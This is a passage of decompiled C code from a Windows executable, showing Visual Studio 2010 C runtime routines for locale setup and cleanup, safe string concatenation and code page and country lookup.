    uVar72 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x38,(void *)((int)param_1 + 0x120)
                             );
    uVar73 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x39,(void *)((int)param_1 + 0x124)
                             );
    uVar74 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x3a,(void *)((int)param_1 + 0x128)
                             );
    uVar75 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x3b,(void *)((int)param_1 + 300));
    uVar76 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x3c,(void *)((int)param_1 + 0x130)
                             );
    uVar77 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x3d,(void *)((int)param_1 + 0x134)
                             );
    uVar78 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x3e,(void *)((int)param_1 + 0x138)
                             );
    uVar79 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x3f,(void *)((int)param_1 + 0x13c)
                             );
    uVar80 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x40,(void *)((int)param_1 + 0x140)
                             );
    uVar81 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x41,(void *)((int)param_1 + 0x144)
                             );
    uVar82 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x42,(void *)((int)param_1 + 0x148)
                             );
    uVar83 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x43,(void *)((int)param_1 + 0x14c)
                             );
    uVar84 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x28,(void *)((int)param_1 + 0x150)
                             );
    uVar85 = ___getlocaleinfo((_locale_t)&local_10,2,_LocaleName,0x29,(void *)((int)param_1 + 0x154)
                             );
    uVar86 = ___getlocaleinfo((_locale_t)&local_10,2,local_8,0x1f,(void *)((int)param_1 + 0x158));
    uVar87 = ___getlocaleinfo((_locale_t)&local_10,2,local_8,0x20,(void *)((int)param_1 + 0x15c));
    uVar1 = ___getlocaleinfo((_locale_t)&local_10,2,local_8,0x1003,(void *)((int)param_1 + 0x160));
    uVar1 = uVar1 | uVar2 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11
                    | uVar12 | uVar13 | uVar14 | uVar15 | uVar16 | uVar17 | uVar18 | uVar19 | uVar20
                    | uVar21 | uVar22 | uVar23 | uVar24 | uVar25 | uVar26 | uVar27 | uVar28 | uVar29
                    | uVar30 | uVar31 | uVar32 | uVar33 | uVar34 | uVar35 | uVar36 | uVar37 | uVar38
                    | uVar39 | uVar40 | uVar41 | uVar42 | uVar43 | uVar44 | uVar45 | uVar46 | uVar47
                    | uVar48 | uVar49 | uVar50 | uVar51 | uVar52 | uVar53 | uVar54 | uVar55 | uVar56
                    | uVar57 | uVar58 | uVar59 | uVar60 | uVar61 | uVar62 | uVar63 | uVar64 | uVar65
                    | uVar66 | uVar67 | uVar68 | uVar69 | uVar70 | uVar71 | uVar72 | uVar73 | uVar74
                    | uVar75 | uVar76 | uVar77 | uVar78 | uVar79 | uVar80 | uVar81 | uVar82 | uVar83
                    | uVar84 | uVar85 | uVar86 | uVar87;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___free_lc_time
// 
// Library: Visual Studio 2010 Release

void __cdecl ___free_lc_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    _free(param_1[1]);
    _free(param_1[2]);
    _free(param_1[3]);
    _free(param_1[4]);
    _free(param_1[5]);
    _free(param_1[6]);
    _free(*param_1);
    _free(param_1[8]);
    _free(param_1[9]);
    _free(param_1[10]);
    _free(param_1[0xb]);
    _free(param_1[0xc]);
    _free(param_1[0xd]);
    _free(param_1[7]);
    _free(param_1[0xe]);
    _free(param_1[0xf]);
    _free(param_1[0x10]);
    _free(param_1[0x11]);
    _free(param_1[0x12]);
    _free(param_1[0x13]);
    _free(param_1[0x14]);
    _free(param_1[0x15]);
    _free(param_1[0x16]);
    _free(param_1[0x17]);
    _free(param_1[0x18]);
    _free(param_1[0x19]);
    _free(param_1[0x1a]);
    _free(param_1[0x1b]);
    _free(param_1[0x1c]);
    _free(param_1[0x1d]);
    _free(param_1[0x1e]);
    _free(param_1[0x1f]);
    _free(param_1[0x20]);
    _free(param_1[0x21]);
    _free(param_1[0x22]);
    _free(param_1[0x23]);
    _free(param_1[0x24]);
    _free(param_1[0x25]);
    _free(param_1[0x26]);
    _free(param_1[0x27]);
    _free(param_1[0x28]);
    _free(param_1[0x29]);
    _free(param_1[0x2a]);
    _free(param_1[0x2f]);
    _free(param_1[0x30]);
    _free(param_1[0x31]);
    _free(param_1[0x32]);
    _free(param_1[0x33]);
    _free(param_1[0x34]);
    _free(param_1[0x2e]);
    _free(param_1[0x36]);
    _free(param_1[0x37]);
    _free(param_1[0x38]);
    _free(param_1[0x39]);
    _free(param_1[0x3a]);
    _free(param_1[0x3b]);
    _free(param_1[0x35]);
    _free(param_1[0x3c]);
    _free(param_1[0x3d]);
    _free(param_1[0x3e]);
    _free(param_1[0x3f]);
    _free(param_1[0x40]);
    _free(param_1[0x41]);
    _free(param_1[0x42]);
    _free(param_1[0x43]);
    _free(param_1[0x44]);
    _free(param_1[0x45]);
    _free(param_1[0x46]);
    _free(param_1[0x47]);
    _free(param_1[0x48]);
    _free(param_1[0x49]);
    _free(param_1[0x4a]);
    _free(param_1[0x4b]);
    _free(param_1[0x4c]);
    _free(param_1[0x4d]);
    _free(param_1[0x4e]);
    _free(param_1[0x4f]);
    _free(param_1[0x50]);
    _free(param_1[0x51]);
    _free(param_1[0x52]);
    _free(param_1[0x53]);
    _free(param_1[0x54]);
    _free(param_1[0x55]);
    _free(param_1[0x56]);
    _free(param_1[0x57]);
    _free(param_1[0x58]);
  }
  return;
}



// Library Function - Single Match
//  ___init_time
// 
// Library: Visual Studio 2010 Release

int __cdecl ___init_time(threadlocinfo *_LocInfo)

{
  undefined **ppuVar1;
  undefined **_Memory;
  int iVar2;
  uint uVar3;
  
  if (_LocInfo->lc_category[1].locale == (char *)0x0) {
    _Memory = &PTR_DAT_003d6ba0;
LAB_003bb3dd:
    ppuVar1 = (undefined **)_LocInfo[1].lc_category[0].wrefcount;
    if (ppuVar1 != &PTR_DAT_003d6ba0) {
      InterlockedDecrement((LONG *)(ppuVar1 + 0x2d));
    }
    _LocInfo[1].lc_category[0].wrefcount = (int *)_Memory;
    iVar2 = 0;
  }
  else {
    _Memory = (undefined **)__calloc_crt(1,0x164);
    if (_Memory != (undefined **)0x0) {
      uVar3 = __get_lc_time(_Memory);
      if (uVar3 == 0) {
        _Memory[0x2d] = (undefined *)0x1;
        goto LAB_003bb3dd;
      }
      ___free_lc_time(_Memory);
      _free(_Memory);
    }
    iVar2 = 1;
  }
  return iVar2;
}



// Library Function - Single Match
//  ___free_lconv_num
// 
// Library: Visual Studio 2010 Release

void __cdecl ___free_lconv_num(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_003d6468) {
      _free(*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_003d646c) {
      _free(param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_003d6470) {
      _free(param_1[2]);
    }
    if ((undefined *)param_1[0xc] != PTR_DAT_003d6498) {
      _free(param_1[0xc]);
    }
    if ((undefined *)param_1[0xd] != PTR_DAT_003d649c) {
      _free(param_1[0xd]);
    }
  }
  return;
}



// Library Function - Single Match
//  ___init_numeric
// 
// Library: Visual Studio 2010 Release

int __cdecl ___init_numeric(threadlocinfo *_LocInfo)

{
  char cVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  char *pcVar7;
  LONG LVar8;
  int iVar9;
  undefined **_Address;
  void **ppvVar10;
  LPCWSTR _LocaleName;
  char *pcVar11;
  undefined **ppuVar12;
  localeinfo_struct local_14;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_14.locinfo = (pthreadlocinfo)_LocInfo;
  local_14.mbcinfo = (pthreadmbcinfo)0x0;
  if ((_LocInfo->lc_category[0].wrefcount == (int *)0x0) &&
     (_LocInfo->lc_category[0].refcount == (int *)0x0)) {
    local_8 = (undefined4 *)0x0;
    local_c = (undefined4 *)0x0;
    _Address = &PTR_DAT_003d6468;
LAB_003bb5fe:
    if ((LONG *)_LocInfo->locale_name[5] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)_LocInfo->locale_name[5]);
    }
    if (((LONG *)_LocInfo->locale_name[4] != (LONG *)0x0) &&
       (LVar8 = InterlockedDecrement((LONG *)_LocInfo->locale_name[4]), LVar8 == 0)) {
      _free(_LocInfo->locale_name[4]);
      _free((void *)_LocInfo[1].lc_codepage);
    }
    _LocInfo->locale_name[5] = (wchar_t *)local_8;
    _LocInfo->locale_name[4] = (wchar_t *)local_c;
    _LocInfo[1].lc_codepage = (uint)_Address;
    iVar9 = 0;
  }
  else {
    _Address = (undefined **)__calloc_crt(1,0x50);
    if (_Address != (undefined **)0x0) {
      ppvVar10 = (void **)_LocInfo[1].lc_codepage;
      ppuVar12 = _Address;
      for (iVar9 = 0x14; iVar9 != 0; iVar9 = iVar9 + -1) {
        *ppuVar12 = (undefined *)*ppvVar10;
        ppvVar10 = ppvVar10 + 1;
        ppuVar12 = ppuVar12 + 1;
      }
      local_c = (undefined4 *)__malloc_crt(4);
      if (local_c != (undefined4 *)0x0) {
        *local_c = 0;
        if (_LocInfo->lc_category[0].wrefcount == (int *)0x0) {
          *_Address = PTR_DAT_003d6468;
          _Address[1] = PTR_DAT_003d646c;
          _Address[2] = PTR_DAT_003d6470;
          _Address[0xc] = PTR_DAT_003d6498;
          local_8 = (undefined4 *)0x0;
          _Address[0xd] = PTR_DAT_003d649c;
        }
        else {
          local_8 = (undefined4 *)__malloc_crt(4);
          if (local_8 == (undefined4 *)0x0) {
            iVar9 = 1;
LAB_003bb4f9:
            _free(_Address);
            _free(local_c);
            return iVar9;
          }
          *local_8 = 0;
          _LocaleName = (LPCWSTR)(uint)*(ushort *)((int)&_LocInfo->lc_category[2].wrefcount + 2);
          uVar2 = ___getlocaleinfo((_locale_t)&local_14,1,_LocaleName,0xe,_Address);
          uVar3 = ___getlocaleinfo((_locale_t)&local_14,1,_LocaleName,0xf,_Address + 1);
          uVar4 = ___getlocaleinfo((_locale_t)&local_14,1,_LocaleName,0x10,_Address + 2);
          uVar5 = ___getlocaleinfo((_locale_t)&local_14,2,_LocaleName,0xe,_Address + 0xc);
          uVar6 = ___getlocaleinfo((_locale_t)&local_14,2,_LocaleName,0xf,_Address + 0xd);
          if ((uVar6 | uVar2 | uVar3 | uVar4 | uVar5) != 0) {
            ___free_lconv_num(_Address);
            iVar9 = -1;
            goto LAB_003bb4f9;
          }
          pcVar7 = _Address[2];
          while (*pcVar7 != '\0') {
            cVar1 = *pcVar7;
            if ((cVar1 < '0') || ('9' < cVar1)) {
              pcVar11 = pcVar7;
              if (cVar1 != ';') goto LAB_003bb5a4;
              do {
                *pcVar11 = pcVar11[1];
                pcVar11 = pcVar11 + 1;
              } while (*pcVar11 != '\0');
            }
            else {
              *pcVar7 = cVar1 + -0x30;
LAB_003bb5a4:
              pcVar7 = pcVar7 + 1;
            }
          }
        }
        *local_c = 1;
        if (local_8 != (undefined4 *)0x0) {
          *local_8 = 1;
        }
        goto LAB_003bb5fe;
      }
      _free(_Address);
    }
    iVar9 = 1;
  }
  return iVar9;
}



// Library Function - Single Match
//  ___free_lconv_mon
// 
// Library: Visual Studio 2010 Release

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_003d6474) {
      _free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_003d6478) {
      _free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_003d647c) {
      _free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_003d6480) {
      _free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_003d6484) {
      _free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_003d6488) {
      _free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_003d648c) {
      _free(*(undefined **)(param_1 + 0x24));
    }
    if (*(undefined **)(param_1 + 0x38) != PTR_DAT_003d64a0) {
      _free(*(undefined **)(param_1 + 0x38));
    }
    if (*(undefined **)(param_1 + 0x3c) != PTR_DAT_003d64a4) {
      _free(*(undefined **)(param_1 + 0x3c));
    }
    if (*(undefined **)(param_1 + 0x40) != PTR_DAT_003d64a8) {
      _free(*(undefined **)(param_1 + 0x40));
    }
    if (*(undefined **)(param_1 + 0x44) != PTR_DAT_003d64ac) {
      _free(*(undefined **)(param_1 + 0x44));
    }
    if (*(undefined **)(param_1 + 0x48) != PTR_DAT_003d64b0) {
      _free(*(undefined **)(param_1 + 0x48));
    }
    if (*(undefined **)(param_1 + 0x4c) != PTR_DAT_003d64b4) {
      _free(*(undefined **)(param_1 + 0x4c));
    }
  }
  return;
}



// Library Function - Single Match
//  ___init_monetary
// 
// Library: Visual Studio 2010 Release

int __cdecl ___init_monetary(threadlocinfo *_LocInfo)

{
  char cVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  uint uVar15;
  uint uVar16;
  uint uVar17;
  uint uVar18;
  uint uVar19;
  uint uVar20;
  uint uVar21;
  uint uVar22;
  char *pcVar23;
  LONG LVar24;
  int iVar25;
  undefined **_Memory;
  LPCWSTR _LocaleName;
  char *pcVar26;
  undefined **ppuVar27;
  undefined **ppuVar28;
  localeinfo_struct local_14;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)0x0;
  local_14.locinfo = (pthreadlocinfo)_LocInfo;
  local_14.mbcinfo = (pthreadmbcinfo)0x0;
  if ((_LocInfo->lc_category[0].refcount == (int *)0x0) &&
     (_LocInfo->lc_category[0].wrefcount == (int *)0x0)) {
    local_8 = (undefined4 *)0x0;
    local_c = (undefined4 *)0x0;
    _Memory = &PTR_DAT_003d6468;
LAB_003bba5a:
    if ((LONG *)_LocInfo[1].refcount != (LONG *)0x0) {
      InterlockedDecrement((LONG *)_LocInfo[1].refcount);
    }
    if (((LONG *)_LocInfo->locale_name[4] != (LONG *)0x0) &&
       (LVar24 = InterlockedDecrement((LONG *)_LocInfo->locale_name[4]), LVar24 == 0)) {
      _free((void *)_LocInfo[1].lc_codepage);
      _free(_LocInfo->locale_name[4]);
    }
    _LocInfo[1].refcount = (int)local_8;
    _LocInfo->locale_name[4] = (wchar_t *)local_c;
    _LocInfo[1].lc_codepage = (uint)_Memory;
    iVar25 = 0;
  }
  else {
    _Memory = (undefined **)__calloc_crt(1,0x50);
    if (_Memory != (undefined **)0x0) {
      local_c = (undefined4 *)__malloc_crt(4);
      if (local_c == (undefined4 *)0x0) {
        _free(_Memory);
      }
      else {
        *local_c = 0;
        if (_LocInfo->lc_category[0].refcount == (int *)0x0) {
          ppuVar27 = &PTR_DAT_003d6468;
          ppuVar28 = _Memory;
          for (iVar25 = 0x14; iVar25 != 0; iVar25 = iVar25 + -1) {
            *ppuVar28 = *ppuVar27;
            ppuVar27 = ppuVar27 + 1;
            ppuVar28 = ppuVar28 + 1;
          }
LAB_003bba06:
          *_Memory = *(undefined **)_LocInfo[1].lc_codepage;
          _Memory[1] = *(undefined **)(_LocInfo[1].lc_codepage + 4);
          _Memory[2] = *(undefined **)(_LocInfo[1].lc_codepage + 8);
          _Memory[0xc] = *(undefined **)(_LocInfo[1].lc_codepage + 0x30);
          _Memory[0xd] = *(undefined **)(_LocInfo[1].lc_codepage + 0x34);
          *local_c = 1;
          if (local_8 != (undefined4 *)0x0) {
            *local_8 = 1;
          }
          goto LAB_003bba5a;
        }
        local_8 = (undefined4 *)__malloc_crt(4);
        if (local_8 == (undefined4 *)0x0) {
          _free(_Memory);
          _free(local_c);
        }
        else {
          *local_8 = 0;
          _LocaleName = (LPCWSTR)(uint)*(ushort *)&_LocInfo->lc_category[2].refcount;
          uVar2 = ___getlocaleinfo((_locale_t)&local_14,1,_LocaleName,0x15,_Memory + 3);
          uVar3 = ___getlocaleinfo((_locale_t)&local_14,1,_LocaleName,0x14,_Memory + 4);
          uVar4 = ___getlocaleinfo((_locale_t)&local_14,1,_LocaleName,0x16,_Memory + 5);
          uVar5 = ___getlocaleinfo((_locale_t)&local_14,1,_LocaleName,0x17,_Memory + 6);
          uVar6 = ___getlocaleinfo((_locale_t)&local_14,1,_LocaleName,0x18,_Memory + 7);
          uVar7 = ___getlocaleinfo((_locale_t)&local_14,1,_LocaleName,0x50,_Memory + 8);
          uVar8 = ___getlocaleinfo((_locale_t)&local_14,1,_LocaleName,0x51,_Memory + 9);
          uVar9 = ___getlocaleinfo((_locale_t)&local_14,0,_LocaleName,0x1a,_Memory + 10);
          uVar10 = ___getlocaleinfo((_locale_t)&local_14,0,_LocaleName,0x19,
                                    (void *)((int)_Memory + 0x29));
          uVar11 = ___getlocaleinfo((_locale_t)&local_14,0,_LocaleName,0x54,
                                    (void *)((int)_Memory + 0x2a));
          uVar12 = ___getlocaleinfo((_locale_t)&local_14,0,_LocaleName,0x55,
                                    (void *)((int)_Memory + 0x2b));
          uVar13 = ___getlocaleinfo((_locale_t)&local_14,0,_LocaleName,0x56,_Memory + 0xb);
          uVar14 = ___getlocaleinfo((_locale_t)&local_14,0,_LocaleName,0x57,
                                    (void *)((int)_Memory + 0x2d));
          uVar15 = ___getlocaleinfo((_locale_t)&local_14,0,_LocaleName,0x52,
                                    (void *)((int)_Memory + 0x2e));
          uVar16 = ___getlocaleinfo((_locale_t)&local_14,0,_LocaleName,0x53,
                                    (void *)((int)_Memory + 0x2f));
          uVar17 = ___getlocaleinfo((_locale_t)&local_14,2,_LocaleName,0x15,_Memory + 0xe);
          uVar18 = ___getlocaleinfo((_locale_t)&local_14,2,_LocaleName,0x14,_Memory + 0xf);
          uVar19 = ___getlocaleinfo((_locale_t)&local_14,2,_LocaleName,0x16,_Memory + 0x10);
          uVar20 = ___getlocaleinfo((_locale_t)&local_14,2,_LocaleName,0x17,_Memory + 0x11);
          uVar21 = ___getlocaleinfo((_locale_t)&local_14,2,_LocaleName,0x50,_Memory + 0x12);
          uVar22 = ___getlocaleinfo((_locale_t)&local_14,2,_LocaleName,0x51,_Memory + 0x13);
          if ((uVar22 | uVar2 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 |
                        uVar11 | uVar12 | uVar13 | uVar14 | uVar15 | uVar16 | uVar17 | uVar18 |
                        uVar19 | uVar20 | uVar21) == 0) {
            pcVar23 = _Memory[7];
            while (*pcVar23 != '\0') {
              cVar1 = *pcVar23;
              if ((cVar1 < '0') || ('9' < cVar1)) {
                pcVar26 = pcVar23;
                if (cVar1 != ';') goto LAB_003bb9de;
                do {
                  *pcVar26 = pcVar26[1];
                  pcVar26 = pcVar26 + 1;
                } while (*pcVar26 != '\0');
              }
              else {
                *pcVar23 = cVar1 + -0x30;
LAB_003bb9de:
                pcVar23 = pcVar23 + 1;
              }
            }
            goto LAB_003bba06;
          }
          ___free_lconv_mon((int)_Memory);
          _free(_Memory);
          _free(local_c);
          _free(local_8);
        }
      }
    }
    iVar25 = 1;
  }
  return iVar25;
}



// Library Function - Single Match
//  _strcat_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _strcat_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  int iVar4;
  errno_t eStack16;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        iVar4 = (int)pcVar3 - (int)_Src;
        do {
          cVar1 = *_Src;
          _Src[iVar4] = cVar1;
          _Src = _Src + 1;
          if (cVar1 == '\0') break;
          _SizeInBytes = _SizeInBytes - 1;
        } while (_SizeInBytes != 0);
        if (_SizeInBytes != 0) {
          return 0;
        }
        *_Dst = '\0';
        piVar2 = __errno();
        eStack16 = 0x22;
        *piVar2 = 0x22;
        goto LAB_003bbad9;
      }
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  eStack16 = 0x16;
  *piVar2 = 0x16;
LAB_003bbad9:
  FUN_003b60f9();
  return eStack16;
}



bool __cdecl FUN_003bbb27(int param_1,int param_2,char **param_3)

{
  char **ppcVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  
  iVar3 = 0;
  iVar2 = 1;
  if (-1 < param_2) {
    do {
      if (iVar2 == 0) break;
      iVar4 = (param_2 + iVar3) / 2;
      ppcVar1 = (char **)(param_1 + iVar4 * 8);
      iVar2 = __stricmp(*param_3,*ppcVar1);
      if (iVar2 == 0) {
        *param_3 = (char *)(ppcVar1 + 1);
      }
      else {
        if (iVar2 < 0) {
          param_2 = iVar4 + -1;
        }
        else {
          iVar3 = iVar4 + 1;
        }
      }
    } while (iVar3 <= param_2);
  }
  return iVar2 == 0;
}



// Library Function - Single Match
//  _ProcessCodePage
// 
// Library: Visual Studio 2010 Release

UINT _ProcessCodePage(void)

{
  int iVar1;
  UINT UVar2;
  char *unaff_ESI;
  int unaff_EDI;
  UINT local_8;
  
  if (((unaff_ESI != (char *)0x0) && (*unaff_ESI != '\0')) &&
     (iVar1 = _strcmp(unaff_ESI,"ACP"), iVar1 != 0)) {
    iVar1 = _strcmp(unaff_ESI,"OCP");
    if (iVar1 != 0) {
      UVar2 = _atol(unaff_ESI);
      return UVar2;
    }
    iVar1 = GetLocaleInfoW(*(LCID *)(unaff_EDI + 0x1c),0x2000000b,(LPWSTR)&local_8,2);
    if (iVar1 == 0) {
      return 0;
    }
    return local_8;
  }
  iVar1 = GetLocaleInfoW(*(LCID *)(unaff_EDI + 0x1c),0x20001004,(LPWSTR)&local_8,2);
  if (iVar1 == 0) {
    return 0;
  }
  if (local_8 != 0) {
    return local_8;
  }
  UVar2 = GetACP();
  return UVar2;
}



// Library Function - Single Match
//  _TestDefaultCountry
// 
// Library: Visual Studio 2010 Release

undefined4 __cdecl _TestDefaultCountry(short param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == *(short *)((int)&DAT_003c8d28 + uVar1)) {
      return 0;
    }
    uVar1 = uVar1 + 2;
  } while (uVar1 < 0x14);
  return 1;
}



// Library Function - Single Match
//  _LcidFromHexString
// 
// Library: Visual Studio 2010 Release

int __fastcall _LcidFromHexString(undefined4 param_1,char *param_2)

{
  char cVar1;
  int iVar2;
  
  iVar2 = 0;
  while (cVar1 = *param_2, cVar1 != '\0') {
    param_2 = param_2 + 1;
    if ((byte)(cVar1 + 0x9fU) < 6) {
      cVar1 = cVar1 + -0x27;
    }
    else {
      if ((byte)(cVar1 + 0xbfU) < 6) {
        cVar1 = cVar1 + -7;
      }
    }
    iVar2 = cVar1 + -0x30 + iVar2 * 0x10;
  }
  return iVar2;
}



// Library Function - Single Match
//  _GetPrimaryLen
// 
// Library: Visual Studio 2010 Release

int __fastcall _GetPrimaryLen(undefined4 param_1,char *param_2)

{
  char cVar1;
  int iVar2;
  
  iVar2 = 0;
  while( true ) {
    cVar1 = *param_2;
    param_2 = param_2 + 1;
    if (((cVar1 < 'A') || ('Z' < cVar1)) && (0x19 < (byte)(cVar1 + 0x9fU))) break;
    iVar2 = iVar2 + 1;
  }
  return iVar2;
}



// Library Function - Single Match
//  _CountryEnumProc@4
// 
// Library: Visual Studio 2010 Release
// lpLocaleEnumProc parameter of EnumSystemLocalesA
// 

void _CountryEnumProc_4(char *param_1)

{
  uint *puVar1;
  uint uVar2;
  _ptiddata p_Var3;
  LCID Locale;
  int iVar4;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar5;
  CHAR in_stack_ffffff80;
  
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  p_Var3 = __getptd();
  Locale = _LcidFromHexString(extraout_ECX,param_1);
  iVar4 = GetLocaleInfoA(Locale,(-(uint)((p_Var3->_setloc_data).bAbbrevCountry != 0) & 0xfffff005) +
                                0x1002,&stack0xffffff80,0x78);
  if (iVar4 == 0) {
    (p_Var3->_setloc_data).iLocState = 0;
    uVar5 = extraout_EDX;
  }
  else {
    iVar4 = __stricmp((char *)(p_Var3->_setloc_data).pchCountry,&stack0xffffff80);
    uVar5 = extraout_EDX_00;
    if ((iVar4 == 0) &&
       (iVar4 = _TestDefaultCountry((short)Locale), uVar5 = extraout_EDX_01, iVar4 != 0)) {
      puVar1 = (uint *)&(p_Var3->_setloc_data).iLocState;
      *puVar1 = *puVar1 | 4;
      *(LCID *)(p_Var3->_setloc_data)._cachein = Locale;
      (p_Var3->_setloc_data)._cachecp = Locale;
    }
  }
  terminate_if_debugger_present(uVar2 ^ (uint)&stack0xfffffffc,uVar5,in_stack_ffffff80);
  return;
}



// Library Function - Single Match
//  _TestDefaultLanguage
// 
// Library: Visual Studio 2010 Release

undefined4 __cdecl _TestDefaultLanguage(int param_1,char **param_2)

{
  char *_Str;
  uint in_EAX;
  int iVar1;
  undefined4 uVar2;
  size_t sVar3;
  size_t sVar4;
  undefined4 extraout_ECX;
  uint local_8;
  
  iVar1 = GetLocaleInfoW(in_EAX & 0x3ff | 0x400,0x20000001,(LPWSTR)&local_8,2);
  if (iVar1 == 0) {
LAB_003bbd50:
    uVar2 = 0;
  }
  else {
    if ((in_EAX != local_8) && (param_1 != 0)) {
      _Str = *param_2;
      sVar3 = _GetPrimaryLen(extraout_ECX,_Str);
      sVar4 = _strlen(_Str);
      if (sVar3 == sVar4) goto LAB_003bbd50;
    }
    uVar2 = 1;
  }
  return uVar2;
}



// Library Function - Single Match
//  _LangCountryEnumProc@4
// 
// Library: Visual Studio 2010 Release
// lpLocaleEnumProc parameter of EnumSystemLocalesA
// 

void _LangCountryEnumProc_4(char *param_1)

{
  uint *puVar1;
  _setloc_struct *p_Var2;
  uint uVar3;
  _ptiddata p_Var4;
  LCID Locale;
  int iVar5;
  size_t sVar6;
  undefined4 extraout_ECX;
  uint extraout_EDX;
  uint extraout_EDX_00;
  uint extraout_EDX_01;
  uint extraout_EDX_02;
  uint extraout_EDX_03;
  uint extraout_EDX_04;
  uint uVar7;
  uint extraout_EDX_05;
  uint extraout_EDX_06;
  uint extraout_EDX_07;
  uint extraout_EDX_08;
  uint extraout_EDX_09;
  CHAR in_stack_ffffff80;
  
  uVar3 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  p_Var4 = __getptd();
  p_Var2 = &p_Var4->_setloc_data;
  Locale = _LcidFromHexString(extraout_ECX,param_1);
  iVar5 = GetLocaleInfoA(Locale,(-(uint)((p_Var4->_setloc_data).bAbbrevCountry != 0) & 0xfffff005) +
                                0x1002,&stack0xffffff80,0x78);
  uVar7 = extraout_EDX;
  if (iVar5 == 0) {
LAB_003bbdd1:
    (p_Var4->_setloc_data).iLocState = 0;
    goto LAB_003bbf40;
  }
  iVar5 = __stricmp((char *)(p_Var4->_setloc_data).pchCountry,&stack0xffffff80);
  uVar7 = extraout_EDX_00;
  if (iVar5 == 0) {
    iVar5 = GetLocaleInfoA(Locale,(-(uint)((p_Var4->_setloc_data).bAbbrevLanguage != 0) & 0xfffff002
                                  ) + 0x1001,&stack0xffffff80,0x78);
    uVar7 = extraout_EDX_01;
    if (iVar5 == 0) goto LAB_003bbdd1;
    iVar5 = __stricmp((char *)p_Var2->pchLanguage,&stack0xffffff80);
    uVar7 = extraout_EDX_02;
    if (iVar5 == 0) {
      puVar1 = (uint *)&(p_Var4->_setloc_data).iLocState;
      *puVar1 = *puVar1 | 0x304;
      (p_Var4->_setloc_data)._cachecp = Locale;
LAB_003bbe81:
      *(LCID *)(p_Var4->_setloc_data)._cachein = Locale;
    }
    else {
      if ((*(byte *)&(p_Var4->_setloc_data).iLocState & 2) == 0) {
        sVar6 = (p_Var4->_setloc_data).iPrimaryLen;
        if ((sVar6 == 0) ||
           (iVar5 = __strnicmp((char *)p_Var2->pchLanguage,&stack0xffffff80,sVar6), iVar5 != 0)) {
          uVar7 = (p_Var4->_setloc_data).iLocState;
          if (((uVar7 & 1) == 0) &&
             (iVar5 = _TestDefaultCountry((short)Locale), uVar7 = extraout_EDX_04, iVar5 != 0)) {
            uVar7 = extraout_EDX_04 | 1;
            (p_Var4->_setloc_data).iLocState = uVar7;
            goto LAB_003bbe81;
          }
        }
        else {
          puVar1 = (uint *)&(p_Var4->_setloc_data).iLocState;
          *puVar1 = *puVar1 | 2;
          *(LCID *)(p_Var4->_setloc_data)._cachein = Locale;
          sVar6 = _strlen((char *)p_Var2->pchLanguage);
          uVar7 = extraout_EDX_03;
          if (sVar6 == (p_Var4->_setloc_data).iPrimaryLen) {
            (p_Var4->_setloc_data)._cachecp = Locale;
          }
        }
      }
    }
  }
  if (((p_Var4->_setloc_data).iLocState & 0x300U) == 0x300) goto LAB_003bbf40;
  iVar5 = GetLocaleInfoA(Locale,(-(uint)((p_Var4->_setloc_data).bAbbrevLanguage != 0) & 0xfffff002)
